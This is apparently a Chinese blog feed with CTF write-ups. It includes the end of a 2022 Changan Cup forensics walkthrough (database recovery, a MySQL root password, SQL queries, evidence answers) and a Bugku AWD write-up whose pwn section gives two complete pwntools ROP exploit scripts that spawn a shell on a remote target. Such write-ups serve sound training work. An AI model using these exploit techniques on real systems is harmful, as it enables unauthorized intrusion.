src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412192804081.png" class title="image-20240412192804081"><p>查看有关文件，发现端口33050，在/data/mysql/下启动docker,同时这里也有22和23题的答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412182338221.png" class title="image-20240412182338221"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">docker-proxy<br></code></pre></td></tr></table></figure><h2 id="21-除MySQL外，该网站还依赖以下哪种数据库"><a href="#21-除MySQL外，该网站还依赖以下哪种数据库" class="headerlink" title="21.除MySQL外，该网站还依赖以下哪种数据库"></a>21.除MySQL外，该网站还依赖以下哪种数据库</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193418866.png" class title="image-20240412193418866"><p>查看历史命令，发现还启动了nohup了redis和mongo</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">redis和mongo<br></code></pre></td></tr></table></figure><h2 id="22-检材3中，MySQL数据库root账号的密码是"><a href="#22-检材3中，MySQL数据库root账号的密码是" class="headerlink" title="22.检材3中，MySQL数据库root账号的密码是"></a>22.检材3中，MySQL数据库root账号的密码是</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193851285.png" class title="image-20240412193851285"><p>在20题的docker文件中可以发现密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">sshl7701<br></code></pre></td></tr></table></figure><h2 id="23-检材3中，MySQL数据库在容器内部的数据目录为"><a href="#23-检材3中，MySQL数据库在容器内部的数据目录为" class="headerlink" title="23.检材3中，MySQL数据库在容器内部的数据目录为"></a>23.检材3中，MySQL数据库在容器内部的数据目录为</h2><p>在20题的docker文件中可以发现数据库文件在/var/lib/mysql</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412194050132.png" class title="image-20240412194050132"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">/var/lib/mysql<br></code></pre></td></tr></table></figure><h2 id="24-涉案网站调用的MySQL数据库名为"><a href="#24-涉案网站调用的MySQL数据库名为" class="headerlink" title="24.涉案网站调用的MySQL数据库名为"></a>24.涉案网站调用的MySQL数据库名为</h2><p>在检材1的admin-api.jar里发现</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201755416.png" class title="image-20240412201755416"><p>以及检材3的data/mysql/db/8eda4cb0b452.log可以发现</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412202037242.png" class title="image-20240412202037242"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">b1<br></code></pre></td></tr></table></figure><h2 id="25-勒索者在数据库中修改了多少个用户的手机号？-答案填写阿拉伯数字，如“15”"><a href="#25-勒索者在数据库中修改了多少个用户的手机号？-答案填写阿拉伯数字，如“15”" class="headerlink" title="25.勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)"></a>25.勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)</h2><p>在data/mysql/db下，查看8eda4cb0b452.log，搜索UOPDATE,发现有3个命令修改手机号</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201328928.png" class title="image-20240412201328928"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201606706.png" class title="image-20240412201606706"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201356495.png" class title="image-20240412201356495"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">3<br></code></pre></td></tr></table></figure><h2 id="26-勒索者在数据库中删除的用户数量为-答案填写阿拉伯数字，如“15”"><a href="#26-勒索者在数据库中删除的用户数量为-答案填写阿拉伯数字，如“15”" class="headerlink" title="26.勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)"></a>26.勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)</h2><p>还是上面那个文件，搜索DELETE,从973—1000</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412202247958.png" class title="image-20240412202247958"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">28<br></code></pre></td></tr></table></figure><h2 id="27-还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4"><a href="#27-还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4" class="headerlink" title="27.还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4"></a>27.还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4</h2><p>在检材2的D盘发现了搭建网站的数据库文件b1和其他一些文件</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412203530045.png" class title="image-20240412203530045"><p>这里将检材2里D盘发现的b1数据库恢复到/data/mysql/db,启动数据库，查看数据库</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413161057221.png" class title="image-20240413161057221"><p>使用的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start docker<br>docker exec -it 8eda /bin/bash<br>mysql -u root -pshhl7001<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413161919911.png" class title="image-20240413161919911"><p>连接数据库，发现有两个ip,100为检材2的ip（技术员ip）,197的就为所求ip</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412225905572.png" class title="image-20240412225905572"><p>这里也可以看日志，搜索172.16.80，发现admin登录只有100和197的ip。</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.197<br></code></pre></td></tr></table></figure><h2 id="28-还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为"><a href="#28-还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为" class="headerlink" title="28.还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为"></a>28.还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为</h2><p>在member_wallet表中，找到id=500的用户</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413164220631.png" class title="image-20240413164220631"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">cee631121c2ec9232f3a2f028ad5c89b<br></code></pre></td></tr></table></figure><h2 id="29-还原全部被删改数据，共有多少名用户的会员等级为’LV3’-答案填写阿拉伯数字，如“15”"><a href="#29-还原全部被删改数据，共有多少名用户的会员等级为’LV3’-答案填写阿拉伯数字，如“15”" class="headerlink" title="29.还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)"></a>29.还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)</h2><p>在member表里搜索等级为3的用户，共158个</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413164538622.png" class title="image-20240413164538622"><p>在上面数据库文件不包括删除的</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165635903.png" class title="image-20240413165635903"><p>在数据库日志中查到下方内容，按照等级为3用户的数据特征搜索973-1000的用户</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165552462.png" class title="image-20240413165552462"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165834230.png" class title="image-20240413165834230"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165853503.png" class title="image-20240413165853503"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165911743.png" class title="image-20240413165911743"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165941823.png" class title="image-20240413165941823"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165955719.png" class title="image-20240413165955719"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413170018254.png" class title="image-20240413170018254"><p>发现有6个，故答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">158+6=164<br></code></pre></td></tr></table></figure><h2 id="30-还原全部被删改数据，哪些用户ID没有充值记录-答案填写阿拉伯数字，多个ID以逗号分隔，“15-16-17”"><a href="#30-还原全部被删改数据，哪些用户ID没有充值记录-答案填写阿拉伯数字，多个ID以逗号分隔，“15-16-17”" class="headerlink" title="30.还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，“15,16,17”)"></a>30.还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，“15,16,17”)</h2><p>在member_wallet里balance为0是没有充值用户（这个表没有被删除数据），查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> b1.member_wallet <span class="hljs-keyword">WHERE</span> balance <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172116771.png" class title="image-20240413172116771"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">318，989<br></code></pre></td></tr></table></figure><h2 id="31-还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？-答案填写阿拉伯数字，如“15”"><a href="#31-还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？-答案填写阿拉伯数字，如“15”" class="headerlink" title="31.还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)"></a>31.还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)</h2><p>在member_transaction里查询当天的交易数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `member_transaction` <span class="hljs-keyword">WHERE</span> create_time <span class="hljs-keyword">BETWEEN</span> &quot;2022-10-17  00:00:00&quot; <span class="hljs-keyword">AND</span> &quot;2022-10-17 23:59:59&quot;<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172459751.png" class title="image-20240413172459751"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">1000<br></code></pre></td></tr></table></figure><h2 id="32-还原全部被删改数据，该网站中充值的USDT总额为-答案填写阿拉伯数字，如“15”"><a href="#32-还原全部被删改数据，该网站中充值的USDT总额为-答案填写阿拉伯数字，如“15”" class="headerlink" title="32.还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)"></a>32.还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)</h2><p>对金额求和</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">FROM</span> member_transaction<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413172620549.png" class title="image-20240413172620549"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">408228.00000000<br></code></pre></td></tr></table></figure><h2 id="33-嫌疑人使用的安卓模拟器软件名称是"><a href="#33-嫌疑人使用的安卓模拟器软件名称是" class="headerlink" title="33.嫌疑人使用的安卓模拟器软件名称是"></a>33.嫌疑人使用的安卓模拟器软件名称是</h2><p>检材4解压得到一个npbk文件，百度得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415140318092.png" class title="image-20240415140318092"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">夜神模拟器<br></code></pre></td></tr></table></figure><h2 id="34-检材4中，“老板”的阿里云账号是"><a href="#34-检材4中，“老板”的阿里云账号是" class="headerlink" title="34.检材4中，“老板”的阿里云账号是"></a>34.检材4中，“老板”的阿里云账号是</h2><p>下载模拟器，导入npbk文件，在微信聊天记录里发现老板阿里云账号（这里打开微信需要断开网络，不然微信会退出，要求重新登录）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142327826.png" class title="image-20240415142327826"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">forensixtech1<br></code></pre></td></tr></table></figure><h2 id="35-检材4中安装的VPN工具的软件名称是"><a href="#35-检材4中安装的VPN工具的软件名称是" class="headerlink" title="35.检材4中安装的VPN工具的软件名称是"></a>35.检材4中安装的VPN工具的软件名称是</h2><p>在桌面发现vpn软件</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415141944182.png" class title="image-20240415141944182"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">v2rayNG<br></code></pre></td></tr></table></figure><h2 id="36-上述VPN工具中记录的节点IP是"><a href="#36-上述VPN工具中记录的节点IP是" class="headerlink" title="36.上述VPN工具中记录的节点IP是"></a>36.上述VPN工具中记录的节点IP是</h2><p>打开vpn，得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142654778.png" class title="image-20240415142654778"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">38.68.135.18：8090<br></code></pre></td></tr></table></figure><h2 id="37-检材4中，录屏软件安装时间为"><a href="#37-检材4中，录屏软件安装时间为" class="headerlink" title="37.检材4中，录屏软件安装时间为"></a>37.检材4中，录屏软件安装时间为</h2><p>找到手机文件，发现一个LuPingDaShi的文件夹</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415142957781.png" class title="image-20240415142957781"><p>答案</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2022</span>/<span class="hljs-number">10</span>/<span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><h2 id="38-上述录屏软件中名为“s-20221019105129”的录像，在模拟器存储中对应的原始文件名为"><a href="#38-上述录屏软件中名为“s-20221019105129”的录像，在模拟器存储中对应的原始文件名为" class="headerlink" title="38.上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为"></a>38.上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为</h2><p>在手机文件夹/storage/emulated/0/Android/data/com.jiadi.luping/files/Movies目录下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d<br></code></pre></td></tr></table></figure><h2 id="39-上述录屏软件登录的手机号是"><a href="#39-上述录屏软件登录的手机号是" class="headerlink" title="39.上述录屏软件登录的手机号是"></a>39.上述录屏软件登录的手机号是</h2><p>选择帮助与反馈-&gt;账号注销即可看到完整手机号（这里需要连接网络，不然一直在加载）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415144224605.png" class title="image-20240415144224605"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">18645091802<br></code></pre></td></tr></table></figure><h2 id="40-检材4中，发送勒索邮件的邮箱地址为"><a href="#40-检材4中，发送勒索邮件的邮箱地址为" class="headerlink" title="40.检材4中，发送勒索邮件的邮箱地址为"></a>40.检材4中，发送勒索邮件的邮箱地址为</h2><p>在qq邮箱中已发送邮件中找到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240415145413008.png" class title="image-20240415145413008"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">skterran@163.com<br></code></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://blog.csdn.net/qq_56037764/article/details/127834747">2022第四届长安杯复盘（WP）_长安杯复现-CSDN博客</a></p><p><a href="https://www.forensics-wiki.com/writeup/2022changancup/#8-1apkhttpswwwforensixcnabcdef">2022长安杯Writeup - Forensics-Wiki</a></p><p><a href="https://forensics.xidian.edu.cn/wiki/ChanganCup2022/#8-1-apkhttpswwwforensixcnabcdef">2022长安杯 - XDforensics-Wiki (xidian.edu.cn)</a></p><p><a href="https://blog.csdn.net/jyttttttt/article/details/127704893">2022第四届长安杯WRITE UP_2022长安杯wp-CSDN博客</a></p><h2 id="仿真后连接xshell"><a href="#仿真后连接xshell" class="headerlink" title="仿真后连接xshell"></a>仿真后连接xshell</h2><p>连接xshell，<a href="https://blog.csdn.net/ntrybw/article/details/126226322">修改linux内网卡配置，开启dhcp</a>，分配一个ip给虚拟机，重启后查看（当然这里也可以直接挂载在现有linux虚拟机上）</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409104642658.png" class title="image-20240409104642658">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bugku AWD S2-23</title>
    <link href="/2024/03/27/S2-23/"/>
    <url>/2024/03/27/S2-23/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>本次pwn题是bugku上的pwn题Easy_int，这里做个简单分析。</p><p>查看保护，只有NX保护</p><img src="/2024/03/27/S2-23/image-20240327170536541.png" class title="image-20240327170536541"><p>ida F5分析</p><img src="/2024/03/27/S2-23/image-20240327170625374.png" class title="image-20240327170625374"><p>这里有个简单整数溢出,输入2147483648，执行vuln函数，</p><img src="/2024/03/27/S2-23/image-20240327171034907.png" class title="image-20240327171034907"><p>buf这里有个很明显的栈溢出，存在system函数，但是参数不是/bin/sh。Shirt + F12查找字符串，存在字符/bin/sh</p><img src="/2024/03/27/S2-23/image-20240327171302262.png" class title="image-20240327171302262"><p>所以思路很明确，利用这里的栈溢出修改system的参数，拿shell，</p><img src="/2024/03/27/S2-23/image-20240327171557436.png" class title="image-20240327171557436"><p>64位程序，我们需要先控制rdi寄存器，因此构造rop链：b’a’*(0x20+8)+p64(pop_rdi_ret)+p64(binsh)+p64(system),这里需要考虑下堆栈平衡，加个ret或者直接call _system,给出两个版本代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;114.67.175.224&#x27;,17977)</span><br><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br>call_system=<span class="hljs-number">0x4011F0</span><br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi_ret)+p64(binsh)+p64(call_system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;114.67.175.224&#x27;</span>,<span class="hljs-number">17977</span>)<br>elf = ELF (<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-comment">#ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27;</span><br>pop_rdi_ret=<span class="hljs-number">0x401343</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x403500</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>) <br>payload += p64(ret) <br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh) <br>payload += p64(system)<br>p.sendline(<span class="hljs-string">b&#x27;2147483648&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Congratulations!&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>D盾扫描，存在两个过狗一句话</p><img src="/2024/03/27/S2-23/image-20240327172728529.png" class title="image-20240327172728529"><p>网站cms是PbootCMS V3.0.1，</p>]]></content>
    
    
    <categories>
      
      <category>AWD WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD总结</title>
    <link href="/2024/03/26/AWD%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/26/AWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e7764154367ee5f345ddc4a5439922be61c877a72393cac0fac4cb7848055814">4630436162ade97ba2718b7d0c4b3b6368a4b20a50aa8ad2b3a3bc05e28384c207c3b67f5128b45ea60f3d59f1b248d691cfc976ad6addd9cac2d1a64850d656a04d2403a0ffa8639d715c6b8015ca1516bf09f3ec9daea90bdfa32877310fb3a113b3e7e2479394575bc6d5de85d933cfc66bb5a9db3f31f1787832c7321d5852a6a76fd558312485b9c35bbab5786e802842be08ff53fe87c6821d66d60b5d3eec2db15535bcb01a094d044d14bb2ceb43ecaf7a9d62002cf273b0a70f686b1753868cc0dfb542b9e04ea4f324fbd815bcb58335104cd495491f717c2e8f48e82cb264a24f7221936bab0ea2c049106eff340d54d28d5817513e6c53a48e66f5f32a55e88724686cb9ee34d667ef67530a4761f5284bdd27a0a2ef2b49199a24afa3c82babf0e8079896cfba771f066794d541728d7239c3672a3d231bd2fbac7bb3dcb11a6b9cf6ce235793241b3651fc1e1faa7e788c2ce3c3c1761eda391a59cd200814f73608b7e99ed769da0c59e5c068d8e3c2bd6b5354be9dbc8eff645b0c3b9e4c79536353ff76d67563039b634e86663b7f90a19d8c4ad10207b5fdc4f3970fd223f04591cbf64cdfb073156520e0243c9c12ff12bc88655ddc3b0e15ed4d64bf5afaac991706e81642faa54172794600acc5bc5c95880b046821442e44e56229d6d1977efe0c9248328560ff7696486b282b9633a77bda7a58839eead36b38d9fff38429a00e51fbe5484f90c9a4f37faa09faf6fae0b851c9bb379c13bb879c88c49f9ba653bcaa7f506e740ce52c43671beab7ddce01fa870074734f8361eac88ca784983292195b112ff182331508e177602371cc4d421d3221abd9b927c636bed10d8aa1625a1d36e2d3313ce232ce3fe2528be31ac97a5b43d21efd3a0315c56132e4e4a44d1ad93e0caece63c214ca6f2c462e85ae742ec25e3beae1d4ecf2052149c7fe594e113187545b4a2b5d3f3d65ea1a727171b37f69138f0e402428b63458ec676d13e739cc7804a2a8a606bddb95a283d77fea18c9f27ff4425aea50af472a701929b7a12edbca59207946b1d37c233e2d4118f78e0a0a7fe5b973ff58380e71c0d794e063c423e3aa88d4be6770ee3c9c9fadde11fcff94852a57d9d3dd32c9a31de1dd04ba68984d16ecf4caed5118e82fe16f2da89da529c0132f416ea7b3954f6c562e9171262984ee1a4d00f97092f1445b55bc41273335b92f553bb96e3f9e09bb00949637960d0b1283768e5c2a3d7c01c91c9a34712caf27056085d171fd4c08a8ff2e00d90a32aa8c7905a784a4db5dc24df3f6f4f3633c3207b173c9156ac10147dc0ac24b9c5dc2b0a2257e649655febb600543dbdfb097d40fd6eb96bc74b128b081d8d08bea0bba6e9c45dc764eab9e38f2245504e2c0bc2139893984be0cd1fbc86a9db936e0164742c6dc1b5810255bb7709a6a09fc49e625275b6ee3ac6b523f7c36f7be4b0ab2961ffaad3777f3470751f772d60178c0cf08f9d5f978eca8cffe8d6e2772ea1e3d18133deabe19272d2a3